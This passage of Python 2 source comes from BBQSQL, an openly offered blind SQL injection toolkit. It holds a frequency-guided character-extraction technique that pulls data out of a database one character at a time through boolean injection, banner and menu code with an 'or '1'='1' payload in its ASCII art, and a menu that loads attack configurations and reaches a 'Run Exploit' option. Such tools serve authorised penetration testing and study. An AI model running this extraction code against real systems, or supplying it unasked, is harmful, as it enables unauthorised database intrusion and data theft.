'(', '|', 'Z', ':', 'Q', 'Y', '+', '>', 'X', ';', '@', 'J'], '2': ['0', ',', "'", '3', '1', ' ', '.', '5', ')', '2', '"', '6', ':', '4', '7', 'm', ']', '8', '-', '9', '\n', '<', '(', '_', '/', '}', '>', 'e', 'a', 'n', 'f', '[', 'b', 'd', '=', 'F', '*', 'c', '\\', '&', 'S', '@', 'D', '|', '%', ';', 'M', 'P', 'p', 'A', 'B', 'O', 'L', 'T', 'X', '^', 'i', 'o', 'r', 'x'], '6': ['0', ',', '1', ' ', '4', "'", '3', '2', ')', '"', '7', '_', '5', '9', '.', '6', ':', '<', 'c', '\n', '-', '8', '\\', '(', '/', ']', '}', '=', 'b', '%', ';', 'a', 'f', '*', 'e', 'x', '>', '`', 'd'], ':': ['\n', ' ', '/', ':', ']', '3', '0', '"', "'", '%', '2', 'f', '-', '\\', '<', '1', '5', 'p', 'k', 'i', '6', 'b', '4', 'n', 'e', '[', 'j', '(', '8', 'a', ')', 'l', 'g', '|', '.', 'm', 's', '7', 'M', 't', 'v', 'd', 'u', '{', '=', 'Y', '9', 'B', 'o', 'z', 'c', '#', '$', '*', ';', 'A', 'C', 'G', 'H', 'L', 'N', 'P', '_', '^', '`', 'h', 'q', 'r', 'w', 'y'], '>': ['\n', '<', ' ', "'", '>', '"', '\\', '2', '=', '1', '3', 'R', '%', 'C', 'J', 'N', 'V', 'T', 'I', 'y', 'O', 'E', 'x', 'A', 'h', '-', '.', '4', 'F', 'P', 'S', 'D', 'G', '[', 'p', 'M', 'a', 'e', 's', '0', '5', '{', '|', 'f', 'U', '7', '6', '9', '8', 'Y', '`', 'b', 'n', '&', ')', 'm', '(', ']', 'j', '!', '*', '/', '_', 't', 'v', '$', ',', ':', '?', 'B', 'K', 'L', 'Z', 'd', 'o'], 'B': ['a', 'o', 'L', 'U', 'y', 'A', '_', 'r', "'", 'e', ' ', 'u', 'i', 'R', 'E', 'l', 'O', 'Y', 'C', 'I', 'S', 'K', '\\', '\n', '"', '.', 'M', 'N', 'T', ',', 'B', 'W', ')', '(', '3', 'D', 'F', 'J', '-', 'G', 'Z', 'c', ':', 'H', 'Q', 'P', '/', '8', '<', 'V', 'd', 'j', 'x', 'z', '|'], 'F': ['a', 'i', 'o', 'O', 'I', 'u', 'A', 'e', 'T', 'r', ' ', 'l', '_', 'F', 'R', '-', 'L', "'", 'E', 'C', 'K', 'U', '2', '\n', '*', 'S', '0', 's', '8', 'D', ':', '1', 'Q', 'n', '"', 'M', ']', ')', '/', '.', '3', '<', 'G', 'V', 'c', 'j', 'w', 'x'], 'J': ['o', 'S', "'", 'a', 'u', 'O', '"', 'A', 'e', 's', 'C', 'E', 'I', 'P', 'y', ' ', '.', 'K', 'H', 'U', 'T', 'B', 'G', 'M', 'V', 'i', 'h', 't', 'w'], 'N': ['o', 'T', 'G', 'a', 'D', '_', ' ', 'O', 'E', 'A', 'S', "'", 'I', 'e', 'U', 'C', 'u', 'V', 'K', 'F', 'P', 'L', '\n', 'Y', ',', 'N', ')', '.', 'i', '(', '-', 'B', ':', 'M', 'W', 'H', '[', '`', 'J', '"', 'Q', 'Z', '/', 'R', '|', '4', '=', ']', 'g', 'k', 'y'], 'R': ['e', 'E', 'a', 'I', 'O', ' ', 'L', 'G', 'S', '_', 'M', "'", 'u', 'A', 'i', 'R', 'T', 'D', 'F', 'o', '\n', '=', '[', '"', '(', 'Y', 'N', ',', 'U', ')', ':', 'C', ']', '.', 'V', 'K', 's', 'H', '2', 'h', 'B', 'J', 'P', 'W', '-', '/', ';', 'w', '!', 'j', 'r', 'y', 'z'], 'V': ['a', 'i', 'A', 'E', 'e', 'I', "'", 'o', 'N', 'S', 'r', 'T', 'M', 'R', ' ', 'L', 'O', 'C', 'K', 'u', ',', 'B', 'D', 'J', 'U', 'V', '_', '\n', 'G', 'H', 'P', 'W', 'Y', 'X', 'l', 'y'], 'Z': ["'", ' ', 'E', 'a', 'i', ']', 'A', 'g', 'G', 'o', '\n', 'O', '0', 'C', '(', ':', 'e', 'u', 'D', 'H', 'S', 'r', '"', 'V', 'd', 'l', '!', ')', '.', '2', ';', 'I', 'K', 'M', 'L', 'R', 'Z', '\\', '`', 'v', '|'], '^': ['(', '\\', '"', 's', 'c', "'", 'n', '/', '[', 'a', 'm', 'i', 't', ' ', '$', 'd', 'h', '`', 'r', '|', '%', '@', 'e', 'o', 'p', '>', 'u', 'v', ':', '=', '_', 'l', '&', '3', 'E', 'N', 'S', 'b', 'f'], 'b': ['e', 'j', 'l', 'a', 'o', 'u', 'y', 'i', '.', 'r', 's', '_', ' ', '"', 'c', 'd', ')', "'", 'm', 't', '|', '(', '2', 'g', 'b', '\n', '>', ',', 'p', ']', '-', 'q', 'f', 'n', '1', '3', 'k', '6', '/', '=', ':', '\\', 'z', 'G', '[', 'v', 'M', '5', '`', '&', '8', 'C', 'L', 'w', '0', '7', '9', '<', 'N', 'X', '}'], 'f': ['.', ' ', 'i', 'o', 'r', ')', 'e', ',', 'a', 'u', 'f', 'l', 't', '_', '\n', 'y', 's', '=', 'c', 'n', '(', '-', "'", 'k', ':', 'g', 'd', '[', 'm', 'p', '2', 'j', ']', '/', 'S', 'P', '"', '1', '8', '3', '>', 'N', 'T', '`', 'M', '\\', 'h', '0', 'q', '%', 'E', 'V', '}', '7', '+', '9', 'A', 'C', 'D', 'O', 'b', '!', '5', '6', ';', '?', '@', 'R'], 'j': ['a', 'e', 'o', 's', 'u', '.', ',', ' ', ')', "'", '_', ':', 'i', '(', '\n', '=', ']', 'n', '4', 'd', '[', 'c', '1', '2', 'w', '"', 'h', 'k', 'p', 'y', '3', 'S', '\\', 'q', '/', 'Q', '`', 'r'], 'n': [' ', 't', 'g', 'd', 's', 'e', 'a', 'o', 'c', 'i', '(', '_', 'u', "'", 'n', 'f', '.', 'p', ',', 'v', 'k', '\n', 'l', 'y', ')', '>', '"', '=', '-', ':', 'E', 'm', '/', '<', 'r', 'j', '\\', 'h', 'M', 'W', '[', 'D', 'T', '2', 'S', 'F', 'x', 'b', 'R', 'I', '%', 'w', '`', 'z', '3', 'K', ']', 'B', 'P', '1', ';', 'C', 'A', '0', 'N', '!', '&', '@', '#', '?', 'Y', 'G', 'U', 'X', 'q', 'H', 'Z', '|', '*', '4', 'L', '+', '9', 'O'], 'r': ['e', 't', 'o', ' ', 'i', 'a', 'n', 's', 'm', 'y', '(', 'r', 'g', 'u', '.', '_', 'd', 'l', ',', 'c', "'", ')', '\n', 'k', ':', 'b', 'v', 'f', '"', '=', '-', '/', 'D', 'p', 'w', 'F', 'z', '>', '1', 'h', '`', 'R', 'T', 'M', '2', 'j', '[', '\\', 'L', '<', 'C', 'B', 'E', ']', '0', 'N', 'W', '|', '3', '4', 'H', 'O', '{', 'A', '*', '!', 'P', '}', ';', '?', '@', 'X', '5', 'I', '%', '&', 'G', '#', '6', 'Q', 'U', 'V', '+', 'K'], 'v': ['a', 'e', 'i', 'o', ' ', '6', ')', '4', '_', '[', 's', '.', "'", 'c', 'n', '\n', ',', '/', '>', 'r', ':', '\\', 'u', '=', 'l', 't', '(', 'd', 'g', '1', '2', 'I', '"', ']', 'j', 'm', '-', 'E', 'k', '&', '3', '<', 'C', 'Y', 'h', 'q', 'p', 'w'], 'z': ['e', 'o', 'y', 'i', 'a', ' ', "'", ')', 'k', '(', '_', 'c', 'n', 'z', ':', '"', 'l', '\n', ']', 'h', '.', 't', ',', '2', '=', 'A', 'd', 'f', 'u', 'b', 'g', 's', '/', '`', 'm', 'w', '}', '$', '-', '0', ';', 'j', '>'], '~': ['|', '~', "'", '=', ' ', '"', '0', '!', 'f', ']', 'o', '/'], '!': ['=', '"', '~', '\n', "'", ' ', '\\', '/', '[', '<', '|', '#', '!', '%', ')', '$', '*', '-', '.', '?', '@', 'p'], '%': [' ', 's', '}', 'd', '(', 'r', '\n', 'Y', 'm', 'M', '%', 'H', 'S', 'p', 'I', 'b', 'B', 'C', 'y', '0', '2', '9', 'A', '"', '3', '8', 'E', 'w', "'", '.', '\\', 'f', 'i', '&', ')', ',', '[', '^', '`'], ')': ['\n', ':', ',', ')', ' ', '.', ']', "'", '}', 's', '[', '"', '(', '/', '?', ';', '\\', '+', '`', '|', '*', '-', '>', '$', 'd', 'f', '^', '<', '#', '&', '!', '%', '@', 'E', 'L', 'P', 'R', 'e', 'i', 'r', '{'], '-': ['-', ' ', '1', 's', 't', 'c', '2', '0', '8', 'v', 'n', 'l', 'd', 'm', 'e', 'i', '*', 'b', 'a', '%', 'r', '\n', '9', 'T', 'p', 'u', 'f', 'M', '+', 'I', "'", '3', 'o', 'D', 'C', 'O', '=', 'A', 'L', 'k', 'z', '4', '\\', 'w', 'Z', '<', 'g', '>', 'h', 'S', 'B', '5', 'q', 'F', 'P', '6', 'E', ']', '(', '#', '"', 'H', 'j', 'x', 'W', 'R', 'V', ')', 'G', '_', 'J', '?', 'K', 'N', 'U', '7', '.', '~', '!', '@', 'X', '`', '|', '/', '[', 'y'], '1': ['0', ',', ')', '2', ' ', "'", '.', '"', '3', '1', ']', '6', ':', '7', '4', '\n', '8', '9', '-', '<', '5', '/', '_', '\\', '(', 'f', '>', 'e', '[', '&', '=', 'c', 'F', 'a', 'k', ';', 'b', 'i', '|', 'Q', 'd', '+', 'P', 'n', 't', 'r', '}', 'E', 'o', 'p', 's', '{', '%', '*', 'A', '@', 'g', 'h', 'x'], '5': [' ', ',', "'", '0', ')', '2', '1', '5', '"', '6', '.', '3', '4', '7', '<', '9', '\n', ':', 'D', 'b', '/', '8', '_', ']', '(', '\\', '-', ';', 'd', '+', '*', 'e', 's', 'P', 'a', '%', '?', 'C', 'M', 'X', 'l', 'p'], '9': ['9', '2', '0', '8', ',', '"', "'", '7', ' ', '4', ')', '1', ']', '.', '6', '<', '-', '5', '3', '_', '/', ';', '\n', ':', 'I', 'a', '(', 'A', 'c', 'b', 'd', '+', 'C', '!', '#', '%', 'T', '\\', 'e', 'f'], '=': [' ', '"', '=', "'", 'N', 'T', 'F', '1', 's', '{', '2', '(', '[', '0', 'u', 'c', 'd', '%', '3', 'e', 'D', 'v', 'f', 'g', 'l', 'p', '5', 'a', 'm', 'i', 'o', '|', '4', '&', 'n', 't', 'b', 'r', '\n', '-', 'M', 'A', 'L', '/', '6', 'W', '7', 'C', 'S', '\\', 'P', '8', 'B', 'G', 'R', 'U', 'h', 'k', 'q', 'w', '+', '.', 'V', '`', '<', 'E', '_', '>', 'y', '?', 'I', 'H', 'J', ',', ';', ':', 'Q', 'z'], 'A': ['L', 'T', 'r', ' ', 'S', 'R', 'N', 'd', 'U', 'u', 'l', 'M', 'C', 't', 'P', 'G', 'n', "'", 'D', 'B', 's', 'p', 'I', 'X', 'c', 'g', '.', '(', '-', 'Y', '_', 'm', 'b', 'V', 'K', 'v', 'k', 'J', '1', '[', ',', 'f', 'A', 'Z', '4', ':', 'i', 'j', '\n', 'F', 'W', 'y', '0', '2', 'E', 'Q', 'o', '"', ')', 'O', 'w', 'z', '3', '5', '<', '\\', 'a', '`', 'e', 'q', 'x'], 'E': ['q', 'r', 'x', 'O', 'R', 'S', '_', 'T', 'n', 'N', ' ', 'P', 'M', "'", 'D', 'F', 'L', 'X', 'C', 'm', 'A', 'W', ')', ',', ']', 'B', 'l', 'Q', 'v', 'G', '\n', 'a', 'Y', ':', 's', '.', '=', '"', 'V', '(', '-', 'g', 'E', '>', 'u', '6', 'i', ';', 'd', '2', '+', '4', 'U', '\\', '`', 'c', 'e', 'h', 't', '!', '1', '3', 'I', 'K', '[', 'Z', 'p', 'y'], 'I': ['n', 'N', 'f', 'm', 'O', 'T', 'D', 'P', 'C', 'L', 'R', 'A', 'S', 't', 'E', ' ', 'M', 's', "'", 'G', 'F', 'I', 'd', 'X', 'Z', 'B', '_', '1', 'V', ':', 'g', 'l', ')', 'c', '-', '\n', '.', 'r', ',', 'H', 'Q', 'i', 'v', 'y', '/', 'a', '&', 'U', 'W', 'b', 'o', 'w', 'z', '"', 'Y', 'k'], 'M': ['a', 'L', 'o', 'E', 'e', 'u', 'A', 'i', 'y', 'P', 'I', 'S', 'O', 's', '_', "'", ' ', 'U', 'M', 'B', '[', 'T', ':', '"', 'D', 'N', '.', 'Z', '-', '\n', 'C', 'H', 'K', '%', '2', 'G', 'R', ')', '/', 'V', 'Y', 'j', 'p'], 'Q': ['L', 'u', 'U', "'", 'a', '-', 'C', 'G', 'D', '.', ')', '(', '\n', '1', '2', 'V', ','], 'U': ['s', 'R', 'T', 'n', 'L', 'p', 'S', 'N', 'M', 'E', 'G', "'", 'A', 'P', 'I', 't', 'r', 'D', 'C', 'B', 'O', 'K', 'Z', 'u', ' ', ',', 'F', 'V', '_', 'd', 'l', '"', ')', '(', '.', ':', 'a', 'c', 'g', 'i', 'k', 'm'], 'Y': [' ', 'o', '_', "'", '[', 'P', '"', 'G', '-', 'Y', 'T', ',', 'a', 'e', '/', 'S', 'W', '\n', 'A', 'E', '(', 'C', 'I', 'M', 'R', 'l', ')', ']', 'u', '%', ':', 'i', '.', '=', 'J', 'N', 'U', 'Z', 'p', 'v'], ']': ['\n', ')', ',', ' ', '.', ']', '[', ':', "'", '}', '+', '*', '/', '|', '"', '\\', '(', '-', '>', '{', '?', 'H', 'b', '=', '`', 't'], 'a': ['t', 'l', 's', 'n', 'r', 'm', ' ', 'g', 'c', 'd', 'i', 'p', 'b', 'u', 'v', 'y', "'", 'k', 'f', '.', 'x', '_', '"', ')', 'z', '\n', 'w', '(', '=', '|', ',', ':', 'a', '[', 'h', 'j', '&', '1', '>', 'S', '-', 'e', '/', '2', '0', '3', '\\', '4', '5', 'T', '<', 'N', 'L', '*', '6', 'U', 'W', 'o', 'q', 'F', 'M', '`', '%', '+', '7', '9', '8', 'C', 'H', '}', ';', '#', '?', '@', 'Z', ']'], 'e': ['l', 'r', ' ', 's', 't', 'n', 'd', 'c', 'x', 'f', '(', '_', 'a', 'm', '.', ',', ')', '\n', '=', 'p', 'o', ':', "'", 'w', 'q', 'g', 'e', 'y', 'v', 'E', '"', 'i', 'F', '/', 'S', 'b', '-', ']', '[', 'C', 'D', 'T', '`', 'U', 'z', '2', 'u', 'h', 'k', 'M', '1', 'R', 'N', 'L', 'j', '\\', 'V', '<', '0', 'I', '6', '>', '8', 'P', 'W', '3', '|', 'H', '}', 'Q', 'A', ';', '4', '?', 'O', '@', 'G', 'B', '7', '&', '!', 'K', '5', 'Z', 'X', '+', '{', '*', '%', 'J', '9'], 'i': ['n', 's', 'o', 't', 'e', 'l', 'm', 'f', 'c', 'd', 'a', 'r', 'p', 'g', 'v', 'b', "'", 'z', 'x', '>', ' ', '.', 'k', 'q', '"', ']', ')', '_', ',', 'i', 'P', 'j', '1', ':', '\n', 'V', '(', 'W', '-', '\\', 'L', 'h', 'u', 'y', '/', '+', '2', 'w', '<', 'N', '}', '|', 'A', 'G', 'J', '=', '`', 'D', '[', '%', '&', '3', 'I', 'M'], 'm': ['e', 'p', 'a', 'o', ' ', 's', 'i', 'm', '_', 'b', 'u', 'l', '.', "'", '(', 'y', ',', '/', 'n', ')', '2', 'E', '\n', 'S', 't', '-', 'T', '=', '"', ':', 'c', '1', 'd', 'f', 'g', '>', 'W', ']', 'F', 'L', 'Q', 'M', '[', 'k', '`', 'C', 'N', 'z', '3', '?', 'A', 'r', 'O', 'R', 'P', 'U', 'v', '<', '@', 'h', '\\', 'D', 'q', 'x', '%', '0', '}', '$', '+', ';', 'G', 'I', 'H', 'V', 'w', '|'], 'q': ['u', 'l', '_', 'n', '.', 's', ')', ' ', '1', '2', '(', '\n', '=', ',', 'd', "'", '>', '[', 'r', '-', '0', ']', 'i', '|', '"', '\\', 'c', 'f', '}'], 'u': ['r', 'e', 't', 'l', 'n', 's', 'a', "'", 'p', 'm', 'i', 'b', 'g', '"', 'c', 'd', '0', 'o', ' ', 'f', 'u', '.', 'k', 'h', 'v', '\\', '1', '2', 'z', 'j', 'y', '\n', ']', 'x', '%', '(', '-', 'w', ')', '3', 'X', '_', ',', '&', '/', '4', '?', 'E', 'O', 'q'], 'y': [' ', 'p', 's', '_', '.', ':', '(', 't', '\n', ',', 'e', ')', "'", 'l', 'o', 'i', '=', 'g', '"', 'n', 'm', 'w', 'd', 'W', 'a', 'r', 'C', 'F', 'c', '-', 'T', 'E', '<', '/', 'M', 'S', ']', '[', 'b', 'k', 'R', 'O', 'y', 'f', '1', '`', 'z', '>', 'P', '2', 'G', 'I', 'h', 'D', '0', 'U', 'V', ';', 'j', 'B', 'u', '!', '4', 'v', '}', '*', 'L', '3', '?', 'A', 'N', 'Q', '&', '+', 'H', '%', '$', '@', 'Y', 'Z', '\\', '|'], '}': ['\n', '}', ')', ',', "'", '{', ' ', '"', '.', '`', ']', '<', '|', 'F', ';', ':', 'L', '(', 'N', '[', '/', '>', '#', '$', 'H', '\\', 'i', 'o']}
characters_by_freq_python = [' ', 'e', 't', 's', 'a', 'r', 'o', 'i', 'n', 'l', '\n', 'd', 'f', 'u', 'c', 'm', 'p', '_', '.', "'", '(', ')', ',', 'h', 'g', '"', '=', ':', 'y', 'b', 'v', 'w', '#', 'E', 'x', 'k', 'T', '/', '0', '1', 'S', 'j', 'R', '-', '2', 'N', 'q', 'I', 'A', '%', ']', '[', 'C', 'O', 'F', '>', 'L', '<', 'D', 'M', 'P', 'G', '3', '{', '}', 'U', '4', '`', 'z', '*', '\\', 'H', '5', 'B', '6', '8', 'V', 'W', '+', '7', '9', 'K', '|', 'Y', ';', '&', 'J', '@', '?', 'X', 'Q', '!', '^', 'Z', '$', '~']


diagraphs = diagraphs_english_no_nl
characters_by_freq = characters_by_freq_english_no_nl

class FrequencyCharacter(BlindCharacter):
    def __init__(self,previous_char,*args,**kwargs):
        self.previous_char = previous_char
        super(FrequencyCharacter,self).__init__(*args,**kwargs)

    @utilities.debug 
    def run(self):
        #make note of the current greenlet
        self.run_gl = gevent.getcurrent()

        self.working = True        

        tried = []
        chars_to_try = copy(characters_by_freq)
        previous_char_finished = False

        success = False

        while not success and len(chars_to_try):
            if not previous_char_finished and self.previous_char and self.previous_char == "success":
                chars_to_try = filter(lambda c: c not in tried,diagraphs[self.previous_char.char_val])
                previous_char_finished = True

            self.char_val = chars_to_try.pop(0)

            if self._test("="):
                success = True

            tried.append(self.char_val)

            gevent.sleep(0)

        if not success:
            self.error = True
            self.row_die.set((self.char_index,AsyncResult()))
            
        self.done = True
        self.working = False

        #clear the note regarding the running greenlet
        self.run_gl = None


class FrequencyTechnique(BooleanBlindTechnique):
    def _character_generator(self,row_index):
        '''
        creates a Character object for us. this generator is useful just because it keeps track of the char_index
        '''
        char_index = 1
        row_die_event = AsyncResult()

        previous_char = None

        while True:
            c = FrequencyCharacter(\
                row_index     = row_index,\
                char_index    = char_index,\
                queue         = self.q,\
                row_die       = row_die_event,\
                previous_char = previous_char)
            # note the previous char
            previous_char = c
            #increment our char_index
            char_index += 1
            #fire off the Character within our Pool.
            self.character_pool.spawn(c.run)
            yield c

    def _adjust_row_lengths(self):
        ''' 
        if a row is full of "success", but we havent reached the end yet (the last elt isnt "error")
        then we need to increase the row_len.
        '''
        while not self.shutting_down.is_set():
            self.results_lock.acquire()

            for row_index in range(len(self.results)):
                #if the row isn't finished or hasn't been started yet, we add Character()s to the row
                if not len(self.results[row_index]) or ('error' not in self.results[row_index] and self.results[row_index][-1] == "success"):
                    self.results[row_index].append(self.char_gens[row_index].next())

            self.results_lock.release()
            gevent.sleep(.3)

    def _add_rows(self):
        '''
        look at how many gevent "threads" are being used and add more rows to correct this
        '''
        row_index = 0
        while self.need_more_rows:
            # add rows until we realize that we are at the end of rows
            working_rows = len(filter(lambda row: 'working' in row,self.results))
            for row in range(self.concurrency - working_rows):
                self.char_gens.append(self._character_generator(row_index))
                self.results.append([])
                row_index += 1

            gevent.sleep(.3)
            self.need_more_rows = not(len(self.results) and filter(lambda row: len(row) and row[0] == 'error',self.results))
        
        while not self.shutting_down.is_set():
            self.results_lock.acquire()
            # delete any rows that shouldn't have been added in the first place
            errored = filter(lambda ri: len(self.results[ri]) and self.results[ri][0] == 'error',range(len(self.results)))
            if errored:
                end = min(errored)
                for ri in xrange(len(self.results)-1,end-1,-1):
                    del(self.results[ri])

            self.results_lock.release()    
            #if there aren't going to be any more rows in need of deletion we can stop this nonsense
            if self.results and self.results[-1][0] == 'success':
                break
            gevent.sleep(.3)
########NEW FILE########
__FILENAME__ = bbq_core
#
# Centralized classes, work in progress
# 

import re
import os

# used to grab the true path for current working directory
class bcolors:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERL = '\033[4m'
    ENDC = '\033[0m'
    backBlack = '\033[40m'
    backRed = '\033[41m'
    backGreen = '\033[42m'
    backYellow = '\033[43m'
    backBlue = '\033[44m'
    backMagenta = '\033[45m'
    backCyan = '\033[46m'
    backWhite = '\033[47m'

    def disable(self):
        self.PURPLE = ''
        self.CYAN = ''
        self.BLUE = ''
        self.GREEN = ''
        self.YELLOW = ''
        self.RED = ''
        self.ENDC = ''
        self.BOLD = ''
        self.UNDERL = ''
        self.backBlack = ''
        self.backRed = ''
        self.backGreen = ''
        self.backYellow = ''
        self.backBlue = ''
        self.backMagenta = ''
        self.backCyan = ''
        self.backWhite = ''
        self.DARKCYAN = ''


#
# Class for colors
#
def ExitBBQ(exitcode=0):
    print "\n"*100
    print "\n\nGoodbye " + bcolors.RED + os.getlogin() + bcolors.ENDC+", and enjoy a hot plate of ribs on the house.\n"
    quit()

def show_graphics():
    print bcolors.YELLOW + r"""
    _______   _______    ______    ______    ______   __       
   |       \ |       \  /      \  /      \  /      \ |  \      
   | $$$$$$$\| $$$$$$$\|  $$$$$$\|  $$$$$$\|  $$$$$$\| $$      
   | $$__/ $$| $$__/ $$| $$  | $$| $$___\$$| $$  | $$| $$      
   | $$    $$| $$    $$| $$  | $$ \$$    \ | $$  | $$| $$      
   | $$$$$$$\| $$$$$$$\| $$ _| $$ _\$$$$$$\| $$ _| $$| $$      
   | $$__/ $$| $$__/ $$| $$/ \ $$|  \__| $$| $$/ \ $$| $$_____ 
   | $$    $$| $$    $$ \$$ $$ $$ \$$    $$ \$$ $$ $$| $$     \
    \$$$$$$$  \$$$$$$$   \$$$$$$\  \$$$$$$   \$$$$$$\ \$$$$$$$$
                     \$$$                \$$$ """ + bcolors.ENDC           

    print bcolors.RED + r"""
                   _.(-)._
                .'         '.
               / 'or '1'='1  \
               |'-...___...-'|
                \    '='    /
                 `'._____.'` 
                  /   |   \
                 /.--'|'--.\
              []/'-.__|__.-'\[]
                      |
                     [] """ + bcolors.ENDC
    return

def show_banner():
    print "\n"*100
    show_graphics()
    print bcolors.BLUE + """
    BBQSQL injection toolkit ("""+bcolors.YELLOW+"""bbqsql"""+bcolors.BLUE+""")         
    Lead Development: """ + bcolors.RED+"""Ben Toews"""+bcolors.BLUE+"""("""+bcolors.YELLOW+"""mastahyeti"""+bcolors.BLUE+""")         
    Development: """ + bcolors.RED+"""Scott Behrens"""+bcolors.BLUE+"""("""+bcolors.YELLOW+"""arbit"""+bcolors.BLUE+""")         
    Menu modified from code for Social Engineering Toolkit (SET) by: """ + bcolors.RED+"""David Kennedy """+bcolors.BLUE+"""("""+bcolors.YELLOW+"""ReL1K"""+bcolors.BLUE+""")    
    SET is located at: """ + bcolors.RED+"""http://www.secmaniac.com"""+bcolors.BLUE+"""("""+bcolors.YELLOW+"""SET"""+bcolors.BLUE+""")    
    Version: """+bcolors.RED+"""%s""" % ('1.0') +bcolors.BLUE+"""               
    
  """ + bcolors.GREEN+"""  The 5 S's of BBQ: 
    Sauce, Spice, Smoke, Sizzle, and """ + bcolors.RED+"""SQLi
    """
    print  bcolors.ENDC + '\n'

def setprompt(category=None, text=None):
    '''helper function for creating prompt text'''
    #base of prompt
    prompt =  bcolors.UNDERL + bcolors.DARKCYAN + "bbqsql"
    #if they provide a category
    if category:
            prompt += ":"+category
    prompt += ">"
    #if they provide aditional text
    if text:
        prompt += " "+ text + ":"
    prompt += bcolors.ENDC + " "
    return prompt

def about():
    '''define help, credits, and about'''
    print "\n"*100
    show_graphics()
    print "\n"*5
    print bcolors.BOLD + """    Help\n""" + bcolors.ENDC + """
    For help, please view the Readme.MD file for usage examples
    and detailed information on how the tool works

    If you are still running into issues, have ideas for improvements,
    or just feature requests you can submit here:
    """ + bcolors.BOLD + """https://github.com/Neohapsis/bbqsql/issues\n\n""" + bcolors.ENDC 

    print bcolors.BOLD + """    Credits\n""" + bcolors.ENDC + """
    Special thanks to David Kennedy, Kenneth Reitz, Neohapsis, Wikipedia, and
    everyone who has helped file bug fixes.  Oh, and ribs.  Mmmm ribs! \n\n""" 

    print bcolors.BOLD + """    About\n""" + bcolors.ENDC + """
    BBQSQL version 1.0
    https://github.com/Neohapsis/bbqsql
    \n\n""" 

    raw_input("Press any key to continue")

class CreateMenu:
    def __init__(self, text, menu):
        self.text = text
        self.menu = menu

        print text
        #print "\nType 'help' for information on this module\n"

        for i, option in enumerate(menu):

            menunum = i + 1

            # Check to see if this line has the 'return to main menu' code
            match = re.search("0D", option)

            # If it's not the return to menu line:
            if not match:
                if menunum < 10:
                    print('   %s) %s' % (menunum,option))
                else:
                    print('  %s) %s' % (menunum,option))
            else:
                print '\n  99) Return to Main Menu\n'
        return

########NEW FILE########
__FILENAME__ = bbq_menu
import bbqsql

from bbq_core import bcolors
from config import RequestsConfig,bbqsqlConfig
import text
import bbq_core
import time
import os
import sys

import argparse
from ConfigParser import RawConfigParser,NoSectionError,MissingSectionHeaderError
from copy import copy


# config params that are only used in the menu and shouldn't be passed along to BlindSQLi or other parts of bbqsql
exclude_parms = ['csv_output_file','hooks_file']

# main menu
class bbqMenu():
    def __init__(self, run_config=None):
        # default name for config file
        self.config_file = 'attack.cfg'
        try:
            requests_config = RequestsConfig()
            bbqsql_config = bbqsqlConfig()

            results = None
            error = None
            valid = False

            # intitial user menu
            choice = ''
            while choice not in ['99',99,'quit','exit']:
                bbq_core.show_banner()
                show_main_menu = bbq_core.CreateMenu(text.main_text, text.main_menu)
         
                 # special case of list item 99
                print '\n  99) Exit the bbqsql injection toolkit\n'
                
                rvalid = requests_config.validate()
                bvalid = bbqsql_config.validate()
                valid = rvalid and bvalid

                # Big results?  throw that in a csv file!
                if results and len(results) <= 100:
                    print results
                elif results:
                    print '\n\nbbqsql recieved ' + str(len(results)) + ' rows of data, results truncated to last 100'
                    print results[-100:]
                    print '\n\nplease provide a filename so we can save all the results for you'
                    try:
                        import readline
                        readline.parse_and_bind('tab: complete')
                    except ImportError:
                        print 'readline module not found'
                        pass
                    try:
                        readline.parse_and_bind('tab: complete')
                        fname = raw_input('CSV file name [./results.csv]: ')
                    except:
                        print "something went wrong, didn't write results to a file"
                        pass

                    if fname is not None:
                        f = open(fname,'w')
                        f.write("\n".join(",",results))
                        f.close()


                if error: print bbq_core.bcolors.RED+error+ bbq_core.bcolors.ENDC

                if run_config:
                    tmp_req_config = dict()
                    tmp_http_config = dict()
                    try:
                        attack_config = RawConfigParser()
                        self.config_file = [run_config,self.config_file][run_config is '']
                        attack_config.read(self.config_file)
                    except:
                        pass
                    try:
                        for key,val in attack_config.items('Request Config'):
                            tmp_req_config[key] = val
                        for key,val in attack_config.items('HTTP Config'):
                            tmp_http_config[key] = val
                        requests_config.set_config(tmp_req_config)
                        bbqsql_config.set_config(tmp_http_config)
                    except NoSectionError:
                        print "bad config file. try again"

                # Loaded config so clear it out
                run_config = None

                # mainc ore menu
                choice = (raw_input(bbq_core.setprompt()))

                if choice == '1':
                    # Run configuration REPL for HTTP variables
                    requests_config.run_config()
                
                if choice == '2':
                    # Run configuration REPL for bbqsql variables
                    bbqsql_config.run_config()
                
                if choice == '3':                    
                    # Export Config
                    try:
                        import readline
                        readline.parse_and_bind('tab: complete')
                    except ImportError:
                        pass
                    attack_config = RawConfigParser()
                    attack_config.add_section('Request Config')
                    attack_config.add_section('HTTP Config')
                    for key,val in requests_config.get_config().iteritems():
                        attack_config.set('Request Config', key, val)

                    for key,val in bbqsql_config.get_config().iteritems():
                        attack_config.set('HTTP Config', key, val)

                    #get filename
                    try:
                        fname = raw_input('Config file name [./%s]: '%self.config_file)
                        self.config_file = [fname,self.config_file][fname is '']
                        with open(self.config_file, 'wb') as configfile:
                            attack_config.write(configfile)
                    except IOError:
                        print 'Invalid Config or File Path'
                        pass
                    except KeyboardInterrupt:
                        pass 

                if choice == '4':
                    # Import Config
                    try:
                        import readline
                        readline.parse_and_bind('tab: complete')
                    except ImportError:
                        pass
                    tmp_req_config = dict()
                    tmp_http_config = dict()
                    attack_config = RawConfigParser()

                    #get filename
                    try:
                        readline.parse_and_bind('tab: complete')
                        fname = raw_input('Config file name [./%s]: '%self.config_file)
                        self.config_file = [fname,self.config_file][fname is '']
                        attack_config.read(self.config_file)
                    except:
                        pass
                    try:
                        for key,val in attack_config.items('Request Config'):
                            tmp_req_config[key] = val
                        for key,val in attack_config.items('HTTP Config'):
                            tmp_http_config[key] = val
                        requests_config.set_config(tmp_req_config)
                        bbqsql_config.set_config(tmp_http_config)
                    except NoSectionError:
                        print "bad config file. try again"

                if choice == '5' and valid:
                    # Run Exploit
                    results = None

                    # add user defined hooks to our config
                    if bbqsql_config['hooks_file'] and bbqsql_config['hooks_file']['hooks_dict']:
                        bbqsql_config['hooks'] = {'value':bbqsql_config['hooks_file']['hooks_dict'],'name':'hooks','validator':lambda x:True}

                    # combine them into one dictionary
                    attack_config = {}
                    attack_config.update(requests_config.get_config())
                    attack_config.update(bbqsql_config.get_config())

                    #delete unwanted config params before sending the config along
